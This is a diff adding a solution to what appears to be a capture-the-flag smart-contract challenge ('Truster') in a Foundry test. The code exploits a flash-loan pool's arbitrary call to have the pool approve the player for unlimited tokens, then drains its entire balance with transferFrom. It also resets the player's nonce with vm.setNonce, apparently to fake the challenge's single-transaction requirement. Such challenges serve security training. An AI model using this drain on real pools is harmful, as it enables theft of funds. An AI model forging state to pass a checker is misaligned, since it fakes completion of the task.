@@ -51,7 +51,12 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        uint256 tokenBalance = token.balanceOf(address(pool));
+        bytes memory attackCalldata = abi.encodeCall(token.approve, (address(player), type(uint256).max));
+        pool.flashLoan(0, player, address(token), attackCalldata);
+        uint64 initialNounce = vm.getNonce(player);
+        token.transferFrom(address(pool), recovery, tokenBalance);
+        vm.setNonce(player, initialNounce + 1);
     }
 
     /**
